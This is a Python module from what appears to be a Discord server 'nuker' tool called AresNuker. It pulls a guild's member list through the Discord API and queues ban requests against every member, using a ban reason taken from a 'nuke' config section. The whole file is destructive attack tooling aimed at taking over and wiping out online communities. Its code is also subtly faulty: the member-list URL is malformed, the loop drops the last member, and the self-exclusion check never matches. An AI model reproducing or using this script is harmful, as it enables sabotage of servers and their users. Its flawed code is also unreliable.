__import__('sys').path.append('../')
import global_vars, requests, json
from .requests_maker import GetQ
from AresNuker import Console

console = Console()
q = GetQ()
headers = global_vars.headers
config = global_vars.config
guild_id = config['discord']['guild_id']

def GetGuildMembers(guild_id):
	r = requests.get(f"https://discord.com/api/v8/{guild_id}/members", headers = headers)
	json_members = json.loads(r.text)
	members = []
	for i in range(0, len(json_members) - 1):
		id = json_members[i]['user']['id']
		name = json_members[i]['user']['username']
		bot = json_members[i]['user']['bot']
		members.append({'id': id, 'name': name, 'bot': bot}) 
	return members

def BanAll() -> None:
	payload = {'delete_message_days':'0', 'reason': config['nuke']['ban_reason']}
	members = GetGuildMembers(guild_id=guild_id)
	for member in members:
		if member != config['discord']['user_id']:
			try:
				q.put((requests.put, f'https://discord.com/api/v8/guilds/{guild_id}/bans/{member["id"]}', headers, payload))
				console.log(f'Baned {member["name"]}')
			except:
				console.error(f'Unble to ban {member["name"]}')

